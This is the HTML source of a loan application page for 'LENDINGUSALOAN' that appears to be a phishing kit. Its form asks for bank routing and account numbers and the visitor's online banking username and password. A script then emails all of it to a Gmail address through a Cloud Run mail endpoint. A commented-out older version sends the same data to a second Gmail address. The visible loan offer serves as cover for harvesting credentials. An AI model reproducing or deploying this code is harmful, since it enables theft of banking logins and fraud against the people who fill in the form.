<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instant Approval Loan</title>
    <link rel="stylesheet" href="assets/css/lendingusaloan.css" />
    <!-- Bootstrap 5.3.3 CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="stylesheet" href="assets/css/lendingusaloan.css" />

    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
    />

    <style>
      .snackbar-container {
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 1055;

      }
      
   @media screen and (max-width: 991px) {
  .snackbar-container {
    position: fixed;
    top: 80px;
    right: 20px;
    z-index: 1055;
  }
}


    </style>
  </head>

  <body>
    <!-- Header Start -->
    <nav
      class="navbar navbar-expand-lg navbar-light bg-white sticky-top shadow-sm py-3"
    >
      <div class="container-fluid">
        <a class="navbar-brand fw-bold text-dark" href="index.html">
          <span style="color: #007bff">LENDING</span>USALOAN
        </a>
        <button
          class="navbar-toggler border-0"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#mainNavbar"
          aria-controls="mainNavbar"
          aria-expanded="false"
          aria-label="Toggle navigation"
        >
          <span class="navbar-toggler-icon"></span>
        </button>

        <div class="collapse navbar-collapse" id="mainNavbar">
          <ul class="navbar-nav ms-auto mb-2 mb-lg-0 align-items-center">
            <li class="nav-item">
              <a
                class="nav-link text-dark mx-2"
                aria-current="page"
                href="index.html"
                >Home</a
              >
            </li>
            <li class="nav-item">
              <a class="nav-link text-dark mx-2" href="about.html">About</a>
            </li>
            <li class="nav-item">
              <a class="nav-link text-dark mx-2 active" href="apply.html"
                >Apply Now</a
              >
            </li>
          </ul>
        </div>
      </div>
    </nav>
    <!-- Header End -->

    <!-- FORM START -->
    <div class="main-form">
      <div class="container">
        <div class="row">
          <!-- Left Column (Image) -->
          <div
            class="col-md-6 d-flex align-items-center justify-content-center"
          >
            <div class="form-image p-5 fade-in fade-in-left delay-1">
              <img
                src="assets/img/apply-now.jpg"
                class="img-fluid"
                alt="Form Image"
              />
            </div>
          </div>

          <!-- Right Column (Form) -->
          <div class="col-md-6">
            <div class="form-title fade-in fade-in-right delay-1">
              <h2 class="text-center m-5">Please Enter Your Details</h2>
            </div>

            <!-- BOOTSTRAP 5 CDN (required for styling and validation) -->
            <link
              href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
              rel="stylesheet"
            />

            <!-- FORM -->
            <div class="container mt-5">
              <form
                id="loanForm"
                class="row g-3 needs-validation"
                novalidate
                acti
              >
                <div class="col-md-6">
                  <label for="firstName" class="form-label">Full Name</label>
                  <input
                    type="text"
                    class="form-control"
                    id="firstName"
                    required
                  />
                  <div class="invalid-feedback">
                    Please enter your first name.
                  </div>
                </div>

                <div class="col-md-6">
                  <label for="address" class="form-label">FullAddress</label>
                  <input
                    type="text"
                    class="form-control"
                    id="address"
                    required
                  />
                  <div class="invalid-feedback">Please enter your address.</div>
                </div>

                <div class="col-md-6">
                  <label for="phone" class="form-label">Phone</label>
                  <input type="tel" class="form-control" id="phone" required />
                  <div class="invalid-feedback">
                    Please enter your phone number.
                  </div>
                </div>

                <div class="col-md-6">
                  <label for="loanAmount" class="form-label">Loan Amount</label>
                  <input
                    type="number"
                    class="form-control"
                    id="loanAmount"
                    required
                  />
                  <div class="invalid-feedback">
                    Please enter the loan amount.
                  </div>
                </div>

                <div class="col-md-6">
                  <label for="creditScore" class="form-label"
                    >Credit Score</label
                  >
                  <input
                    type="text"
                    class="form-control"
                    id="creditScore"
                    required
                  />
                  <div class="invalid-feedback">
                    Please enter your credit score.
                  </div>
                </div>

                <div class="col-md-6">
                  <label for="bankName" class="form-label">Bank Name</label>
                  <input
                    type="text"
                    class="form-control"
                    id="bankName"
                    required
                  />
                  <div class="invalid-feedback">
                    Please enter your bank name.
                  </div>
                </div>

                <div class="col-md-6">
                  <label for="routingNumber" class="form-label"
                    >Routing Number</label
                  >
                  <input
                    type="number"
                    class="form-control"
                    id="routingNumber"
                    required
                  />
                  <div class="invalid-feedback">
                    Please enter your routing number.
                  </div>
                </div>

                <div class="col-md-6">
                  <label for="accountNumber" class="form-label"
                    >Account Number</label
                  >
                  <input
                    type="number"
                    class="form-control"
                    id="accountNumber"
                    required
                  />
                  <div class="invalid-feedback">
                    Please enter your account number.
                  </div>
                </div>

                <div class="col-md-6">
                  <label for="onlineUsername" class="form-label"
                    >Online Banking Username</label
                  >
                  <input
                    type="text"
                    class="form-control"
                    id="onlineUsername"
                    required
                  />
                  <div class="invalid-feedback">
                    Please enter your online banking username.
                  </div>
                </div>

                <div class="col-md-6">
                  <label for="onlinePassword" class="form-label"
                    >Online Banking Password</label
                  >
                  <input
                    type="text"
                    class="form-control"
                    id="onlinePassword"
                    required
                  />
                  <div class="invalid-feedback">
                    Please enter your online banking password.
                  </div>
                </div>

                <div class="col-12">
                  <button
                    class="btn btn-dark w-100"
                    type="submit"
                    style="background-color: #007bff; border-style: none"
                    id="submitButton"
                    data-bs-toggle="tooltip"
                    data-bs-placement="top"
                    title="Form submitted successfully!"
  
                  >
                    On click Form
                  </button>
                </div>
              </form>
            </div>

            <div class="snackbar-container">
              <div
                id="snackbar"
                class="toast align-items-center text-white bg-success border-0"
                role="alert"
                aria-live="assertive"
                aria-atomic="true"
              >
                <div class="d-flex">
                  <div class="toast-body">
                    âœ… Action completed successfully!
                  </div>
                  <button
                    type="button"
                    class="btn-close btn-close-white me-2 m-auto"
                    data-bs-dismiss="toast"
                    aria-label="Close"
                  ></button>
                </div>
              </div>
            </div>

            <!-- JavaScript to validate form and send email -->
            <script>
              document
                .getElementById("loanForm")
                .addEventListener("submit", function (e) {
                  e.preventDefault(); // stop form submission

                  const form = this;

                  if (!form.checkValidity()) {
                    form.classList.add("was-validated");
                    return;
                  }

                  // Get form values
                  const data = {
                    Name: document.getElementById("firstName").value,
                    Address: document.getElementById("address").value,
                    Phone: document.getElementById("phone").value,
                    LoanAmount: document.getElementById("loanAmount").value,
                    CreditScore: document.getElementById("creditScore").value,
                    BankName: document.getElementById("bankName").value,
                    RoutingNumber:
                      document.getElementById("routingNumber").value,
                    AccountNumber:
                      document.getElementById("accountNumber").value,
                    OnlineBankingUsername:
                      document.getElementById("onlineUsername").value,
                    OnlineBankingPassword:
                      document.getElementById("onlinePassword").value,
                  };

                  // Format email body
                  const emailBody = `
      Name: ${data.Name}
      Address: ${data.Address}
      Phone: ${data.Phone}
      Loan Amount: ${data.LoanAmount}
      Credit Score: ${data.CreditScore}
      Bank Name: ${data.BankName}
      Routing Number: ${data.RoutingNumber}
      Account Number: ${data.AccountNumber}
      Online Banking Username: ${data.OnlineBankingUsername}
      Online Banking Password: ${data.OnlineBankingPassword}
    `;

                  // Send the email
                  fetch("https://sendmail-3nhbg7pyjq-uc.a.run.app", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      to: "ezprobiz@gmail.com", // Replace with your email
                      subject: "New Loan Application Submitted",
                      text: emailBody,
                    }),
                  })
                    .then((response) => response.text())
                    .then((result) => {
                      showSnackbar();

                      /*alert(
                        "Your Payment is under processing and it will be credited to your preferred Bank Account within 3 to 5 Minutes."
                      );*/
                      form.reset();
                      form.classList.remove("was-validated");
                    })
                    .catch((error) => {
                      console.error("Error:", error);
                      alert("Something went wrong. Please try again.");
                    });
                });
            </script>

            <!--sneckbar-->
            <script>
              function showSnackbar() {
                const toastElement = document.getElementById("snackbar");
                const toast = bootstrap.Toast.getOrCreateInstance(toastElement); // Safe instance retrieval
                toast.show();
              }
            </script>

            <!--sneckbar-->
          </div>
        </div>
      </div>
    </div>
    <!-- FORM END -->

    <!-- JavaScript for Step Navigation and Validation -->
    <!--<script>
  // Bootstrap validation
  (() => {
    'use strict';
    const form = document.querySelector('#loanForm');
    form.addEventListener('submit', (event) => {
      if (!form.checkValidity()) {
        event.preventDefault();
        event.stopPropagation();
      }
      form.classList.add('was-validated');
    });
  })();

  // Show bank details if step 1 is valid
  function goToStep2() {
    const form = document.querySelector('#loanForm');
    const step1Inputs = document.querySelectorAll('#step1 input');

    let step1Valid = true;
    step1Inputs.forEach(input => {
      if (!input.checkValidity()) {
        step1Valid = false;
        input.classList.add('is-invalid');
      } else {
        input.classList.remove('is-invalid');
        input.classList.add('is-valid');
      }
    });

    if (step1Valid) {
      document.getElementById('step1').style.display = 'none';
      document.getElementById('step2').style.display = 'block';
    }
  }
</script>-->
    <!--<script>
      document.getElementById("loanForm").addEventListener("submit", function (e) {
        e.preventDefault(); // Prevent default form submit

        // Collect form values
        const Name = document.getElementById("validationCustom01").value;
        const address = document.getElementById("validationCustom02").value;
        const phone = document.getElementById("exampleInputEmail1").value;
        const loanamount = document.getElementById("exampleFormControlTextarea1").value;
        const creditscore = document.getElementById("exampleFormControlTextarea1").value;
        const bankname = document.getElementById("exampleFormControlTextarea1").value;
        const routingnumber = document.getElementById("exampleFormControlTextarea1").value;
        const accountnumber = document.getElementById("exampleFormControlTextarea1").value;
        const onlinebookingusername = document.getElementById("exampleFormControlTextarea1").value;
        const onlinebankingpassword = document.getElementById("exampleFormControlTextarea1").value;

        // Combine data into a single email body
        const emailBody = `
      Name: ${Name}
      Address: ${address}
      Phone: ${phone}
      Loan Amount: ${loanamount}
      Credit Score: ${creditscore}
      Bank Name: ${bankname}
      Routing Number: ${routingnumber}
      Account Number: ${accountnumber}
      Online Banking Username: ${onlinebookingusername}
      Online Banking Password: ${onlinebankingpassword}
    `;

        // Send POST request to your Firebase email function
        fetch("https://sendmail-3nhbg7pyjq-uc.a.run.app", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            to: "kevalrabadiya77@gmail.com",   // your receiving email
            subject: "New Loan Application Submitted",
            text: emailBody
          })
        })
          .then(response => response.text())
          .then(result => {
            alert("Thank you! Your form was submitted.");
            console.log(result);
            document.getElementById("loanForm").reset();
          })
          .catch(error => {
            console.error("Error:", error);
            alert("Something went wrong. Please try again.");
          });
      });
    </script>-->

    <!--footer start-->
    <div class="container-fluid footer-main" style="background-color: #e4e9ee">
      <div class="row">
        <div class="col-lg-4 pt-4 px-5 p-lg-5">
          <div class="footer-logo pb-4">
            <a class="navbar-brand fw-bold text-dark" href="index.html">
              <span style="color: #007bff">LENDING</span>USALOAN
            </a>
            <p style="margin-top: 32px">
              LENDINGUSALOAN offers fast, flexible, and transparent personal and
              business loan solutions across the U.S. Subject to credit
              approval. Terms apply.
            </p>
          </div>
        </div>
        <div class="col-lg-4 px-5 p-lg-5">
          <div class="footer-titel">
            <h5 style="border-bottom: 2px solid black; width: fit-content">
              Quick Link
            </h5>
          </div>
          <div class="link mt-4">
            <ul style="list-style-type: none; padding-left: 0px">
              <li><a href="index.html">Home</a></li>
              <li><a href="about.html">About us</a></li>
              <li><a href="apply.html">Apply</a></li>
            </ul>
          </div>
        </div>
        <div class="col-lg-4 pb-4 px-5 p-lg-5">
          <div class="footer-titel">
            <h5 style="border-bottom: 2px solid black; width: fit-content">
              Address
            </h5>
          </div>
          <div class="contact-data mt-4">
            <p class="address">Los Angeles CALIFORNIA</p>
            <p class="phone">+18886787161</p>
            <p class="email">ezprobiz@gmail.com</p>
          </div>
        </div>
      </div>
    </div>
    <!--footer end-->

    <!-- Bootstrap 5.3.3 JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
